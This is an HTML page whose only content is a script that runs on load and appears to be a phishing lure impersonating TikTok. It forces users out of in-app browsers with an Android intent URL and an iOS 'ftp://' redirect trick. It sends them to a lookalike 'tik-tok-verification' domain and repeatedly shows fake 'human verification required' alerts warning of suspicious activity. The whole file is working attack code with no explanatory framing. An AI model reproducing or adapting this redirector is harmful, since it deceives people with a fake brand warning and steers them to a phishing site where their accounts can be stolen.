<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 20000;

    function theNuke() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android Intent - Always use the 'BROWSABLE' category to force external
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: THE SEAL-BREAKER
            // 1. Fire the FTP protocol to force Safari to wake up and take focus
            window.location.href = "ftp://" + urlNoProt;

            // 2. 150ms delay: While Safari is opening/prompting, we fire the HTTPS link.
            // This 'catches' the browser session we just forced open.
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 150);
            
            // 3. Final fallback to ensure it's not a search query
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 250);
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        // Force jump BEFORE alert
        theNuke();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Force jump AFTER "OK" (User Gesture)
                theNuke();

                setTimeout(securityLoop, 400);
            }
        }, 400);
    }

    window.onload = securityLoop;
</script>

</body>
</html>
